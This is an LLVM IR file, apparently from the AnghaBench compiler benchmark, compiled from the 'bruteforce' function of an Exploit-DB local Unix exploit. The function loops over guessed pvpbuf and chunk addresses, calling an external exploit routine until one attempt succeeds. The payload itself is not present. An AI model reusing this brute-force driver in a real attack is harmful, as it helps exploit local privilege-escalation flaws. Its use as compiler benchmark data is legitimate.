; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22442.c_bruteforce.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22442.c_bruteforce.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_info = type { i32, i32, i32, i32 }

@.str = private unnamed_addr constant [20 x i8] c"Trying pvpbuf=0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"Successfull exploitation with pvpbuf=0x%x and chunk=0x%x\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"Bruteforce failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @bruteforce(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.target_info, align 4
  %4 = alloca i32, align 4
  %5 = bitcast %struct.target_info* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 1
  %9 = load i32, i32* %8, align 4
  %10 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 2
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %9, %11
  %13 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  store i32 %12, i32* %13, align 4
  %14 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %15 = load i32, i32* %14, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %15)
  br label %17

17:                                               ; preds = %58, %2
  %18 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 1
  %19 = load i32, i32* %18, align 4
  %20 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %21 = load i32, i32* %20, align 4
  %22 = sub nsw i32 %19, %21
  %23 = icmp slt i32 %22, 2000
  br i1 %23, label %24, label %59

24:                                               ; preds = %17
  %25 = bitcast %struct.target_info* %3 to { i64, i64 }*
  %26 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %25, i32 0, i32 0
  %27 = load i64, i64* %26, align 4
  %28 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %25, i32 0, i32 1
  %29 = load i64, i64* %28, align 4
  %30 = call i64 @exploit(i64 %27, i64 %29)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %38

32:                                               ; preds = %24
  %33 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  %35 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 3
  %36 = load i32, i32* %35, align 4
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0), i32 %34, i32 %36)
  br label %61

38:                                               ; preds = %24
  %39 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 3
  %40 = load i32, i32* %39, align 4
  %41 = add nsw i32 %40, 4
  store i32 %41, i32* %39, align 4
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp sgt i32 %44, 4
  br i1 %45, label %46, label %58

46:                                               ; preds = %38
  %47 = load i32, i32* %4, align 4
  %48 = mul nsw i32 %47, 4
  %49 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 3
  %50 = load i32, i32* %49, align 4
  %51 = sub nsw i32 %50, %48
  store i32 %51, i32* %49, align 4
  store i32 0, i32* %4, align 4
  %52 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %54 = sub nsw i32 %53, 4
  store i32 %54, i32* %52, align 4
  %55 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %56)
  br label %58

58:                                               ; preds = %46, %38
  br label %17

59:                                               ; preds = %17
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  br label %61

61:                                               ; preds = %59, %32
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @exploit(i64, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
